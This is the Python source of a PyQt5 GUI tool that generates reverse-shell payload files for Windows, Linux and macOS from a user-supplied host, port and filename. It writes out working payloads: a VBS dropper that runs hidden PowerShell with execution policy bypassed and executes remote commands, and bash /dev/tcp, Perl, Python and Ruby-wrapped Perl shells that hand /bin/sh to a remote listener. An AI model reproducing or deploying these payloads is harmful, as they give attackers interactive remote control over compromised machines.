from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton, QComboBox, QMessageBox, QFrame
)
from PyQt5.QtCore import Qt
import os

class ReverseShellGenerator(QWidget):
    def __init__(self, theme, parent=None):
        super().__init__(parent)
        self.theme = theme  # Menyimpan tema yang diterima

        # Main layout with frame for better appearance
        self.main_layout = QVBoxLayout(self)
        self.main_layout.setContentsMargins(10, 10, 10, 10)

        # Background frame for content
        self.content_frame = QFrame(self)
        self.content_frame.setStyleSheet(f"""
            QFrame {{
                background-color: {self.theme['content_background']};
                border-radius: 15px;
                padding: 10px;
                color: {self.theme['text']};
            }}
        """)
        self.content_layout = QVBoxLayout(self.content_frame)

        # Title
        title_label = QLabel("")
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet(f"color: {self.theme['accent']}; font-weight: bold;")
        self.content_layout.addWidget(title_label)

        # Submenu buttons
        button_layout = QHBoxLayout()
        self.windows_button = QPushButton("Windows")
        self.linux_button = QPushButton("Linux")
        self.macos_button = QPushButton("MacOS")

        # Button styling
        for button in [self.windows_button, self.linux_button, self.macos_button]:
            button.setStyleSheet(f"""
                QPushButton {{
                    background-color: {self.theme['button']};
                    color: {self.theme['text']};
                    border-radius: 10px;
                    padding: 5px;
                    font-size: 14px;
                }}
                QPushButton:hover {{
                    background-color: {self.theme['button_hover']};
                }}
            """)
            button_layout.addWidget(button)

        self.content_layout.addLayout(button_layout)

        # Submenu actions
        self.windows_button.clicked.connect(lambda: self.display_revshell_content("windows"))
        self.linux_button.clicked.connect(lambda: self.display_revshell_content("linux"))
        self.macos_button.clicked.connect(lambda: self.display_revshell_content("macos"))

        # Add content frame to the main layout
        self.main_layout.addWidget(self.content_frame)

    def display_revshell_content(self, system):
        # Clear existing content
        while self.content_layout.count() > 2:
            widget = self.content_layout.takeAt(2).widget()
            if widget is not None:
                widget.deleteLater()

        # Reverse shell form layout
        revshell_widget = QWidget(self)
        revshell_layout = QVBoxLayout(revshell_widget)

        # Input fields for LHOST, LPORT, FILENAME
        input_layout = QVBoxLayout()

        title_label = QLabel(f"<h2>{system.capitalize()}")
        title_label.setAlignment(Qt.AlignCenter)
        revshell_layout.addWidget(title_label)
        


        # LHOST
        lhost_layout = QHBoxLayout()
        lhost_label = QLabel("LHOST:")
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("Enter Local Host (e.g., 192.168.1.1)")
        self.lhost_input.setStyleSheet(f"""
            QLineEdit {{
                background-color: {self.theme['content_background']};
                border: 2px solid {self.theme['accent']};
                border-radius: 10px;
                padding: 5px;
                color: {self.theme['text']};
            }}
        """)
        lhost_layout.addWidget(lhost_label)
        lhost_layout.addWidget(self.lhost_input)
        input_layout.addLayout(lhost_layout)

        # LPORT
        lport_layout = QHBoxLayout()
        lport_label = QLabel("LPORT:")
        self.lport_input = QLineEdit()
        self.lport_input.setPlaceholderText("Enter Local Port (e.g., 4444)")
        self.lport_input.setStyleSheet(f"""
            QLineEdit {{
                background-color: { self.theme['content_background']};
                border: 2px solid {self.theme['accent']};
                border-radius: 10px;
                padding: 5px;
                color: {self.theme['text']};
            }}
        """)
        lport_layout.addWidget(lport_label)
        lport_layout.addWidget(self.lport_input)
        input_layout.addLayout(lport_layout)

        # FILENAME
        filename_layout = QHBoxLayout()
        filename_label = QLabel("FILENAME:")
        self.filename_input = QLineEdit()
        self.filename_input.setPlaceholderText("Enter Filename (e.g., shell)")
        self.filename_input.setStyleSheet(f"""
            QLineEdit {{
                background-color: {self.theme['content_background']};
                border: 2px solid {self.theme['accent']};
                border-radius: 10px;
                padding: 5px;
                color: {self.theme['text']};
            }}
        """)
        filename_layout.addWidget(filename_label)
        filename_layout.addWidget(self.filename_input)
        input_layout.addLayout(filename_layout)

        # Additional dropdown for Linux
        if system == "linux":
            script_type_layout = QHBoxLayout()
            script_type_label = QLabel("Script Type:")
            self.script_type = QComboBox()
            self.script_type.addItems(["bash", "perl", "python"])
            self.script_type.setStyleSheet(f"""
                QComboBox {{
                    background-color: {self.theme['content_background']};
                    border: 2px solid {self.theme['accent']};
                    border-radius: 10px;
                    padding: 5px;
                    color: {self.theme['text']};
                }}
                QComboBox:hover {{
                    background-color: {self.theme['button_hover']};
                }}
            """)
            script_type_layout.addWidget(script_type_label)
            script_type_layout.addWidget(self.script_type)
            input_layout.addLayout(script_type_layout)

        revshell_layout.addLayout(input_layout)

        # Create button
        create_button = QPushButton("Create")
        create_button.setStyleSheet(f"""
            QPushButton {{
                background-color: {self.theme['accent']};
                color: white;
                border-radius: 10px;
                padding: 5px;
                font-size: 16px;
            }}
            QPushButton:hover {{
                background-color: {self.theme['button_hover']};
            }}
        """)
        create_button.clicked.connect(lambda: self.create_revshell_file(system))
        revshell_layout.addWidget(create_button)

        # Add content to the main layout
        self.content_layout.addWidget(revshell_widget)

    def create_revshell_file(self, system):
        lhost = self.lhost_input.text()
        lport = self.lport_input.text()
        namefile = self.filename_input.text()
        directory = os.path.join(os.getcwd(), "result", system)

        if not os.path.exists(directory):
            os.makedirs(directory)

        if system == "windows":
            self.generate_vbs_reverse_shell(lhost, lport, namefile, directory)
        elif system == "linux":
            script_type = self.script_type.currentText() if hasattr(self, 'script_type') else "bash"
            if script_type == "perl":
                self.generate_linux_perl_file(lhost, lport, namefile, directory)
            elif script_type == "python":
                self.generate_linux_python_file(lhost, lport, namefile, directory)
            elif script_type == "bash":
                self.generate_linux_bash_file(lhost, lport, namefile, directory)
        elif system == "macos":
            self.generate_macos_bash_file(lhost, lport, namefile, directory)
        else:
            QMessageBox.critical(self, "Error", "Invalid selection!")

    def generate_vbs_reverse_shell(self, lhost, lport, namefile, directory):
        payload = f'''Set objShell = CreateObject("WScript.Shell")

ps1Content = "$ErrorActionPreference = 'SilentlyContinue';"
ps1Content = ps1Content & "$h = '{lhost}';"
ps1Content = ps1Content & "$p = {lport};"
ps1Content = ps1Content & "try {{$client = New-Object System.Net.Sockets.TcpClient($h, $p);"
ps1Content = ps1Content & "$stream = $client.GetStream();"
ps1Content = ps1Content & "$writer = New-Object System.IO.StreamWriter($stream);"
ps1Content = ps1Content & "$reader = New-Object System.IO.StreamReader($stream);"
ps1Content = ps1Content & "$writer.AutoFlush = $true;"
ps1Content = ps1Content & "$writer.WriteLine('Connected to $($h):$($p)');"
ps1Content = ps1Content & "while ($true) {{"
ps1Content = ps1Content & "$command = $reader.ReadLine();"
ps1Content = ps1Content & "if ([string]::IsNullOrWhiteSpace($command)) {{ continue }};"
ps1Content = ps1Content & "if ($command -eq 'exit') {{ break }};"
ps1Content = ps1Content & "$result = try {{Invoke-Expression $command 2>&1 | Out-String}} catch {{$_.Exception.Message}};"
ps1Content = ps1Content & "$writer.WriteLine($result);"
ps1Content = ps1Content & "$writer.Write('PS> ');}};"
ps1Content = ps1Content & "$client.Close();}} catch {{$_.Exception.Message;}}"

ps1Content = Replace(ps1Content, "\"", """")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command """ & ps1Content & """", 0, False
'''
        file_path = os.path.join(directory, f"{namefile}.vbs")
        with open(file_path, 'w') as file:
            file.write(payload)
        QMessageBox.information(self, "File Created", f"File {namefile}.vbs created in '{directory}' folder.")

    def generate_linux_bash_file(self, lhost, lport, namefile, directory):
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        file_path = os.path.join(directory, f"{namefile}.sh")
        with open(file_path, 'w') as file:
            file.write(payload)
        QMessageBox.information(self, "File Created", f"File {namefile}.sh created in '{directory}' folder.")

    def generate_linux_perl_file(self, lhost, lport, namefile, directory):
        payload = f"""#!/usr/bin/perl
use strict;
use warnings;
use Socket;

my $ip = '{lhost}';
my $port = {lport};
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCK, sockaddr_in($port, inet_aton($ip)));
open(STDIN, \"&>SOCK\");
open(STDOUT, \"&>SOCK\");
open(STDERR, \"&>SOCK\");
exec(\"/bin/sh -i\");
"""
        file_path = os.path.join(directory, f"{namefile}.pl")
        with open(file_path, 'w') as file:
            file.write(payload)
        QMessageBox.information(self, "File Created", f"File {namefile}.pl created in '{directory}' folder.")

    def generate_linux_python_file(self, lhost, lport, namefile, directory):
        payload = f"""#!/usr/bin/python3
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{lhost}', {lport}))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call([\"/bin/sh\", \"-i\"])
"""
        file_path = os.path.join(directory, f"{namefile}.py")
        with open(file_path, 'w') as file:
            file.write(payload)
        QMessageBox.information(self, "File Created", f"File {namefile}.py created in '{directory}' folder.")

    def generate_macos_bash_file(self, lhost, lport, namefile, directory):
        payload = f"""require 'socket'
exec \"/usr/bin/perl -e 'use Socket;$i=\\\"{lhost}\\\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");}};'\"
"""
        file_path = os.path.join(directory, f"{namefile}.rb")
        with open(file_path, 'w') as file:
            file.write(payload)
        QMessageBox.information(self, "File Created", f"File {namefile}.rb created in '{directory}' folder.")
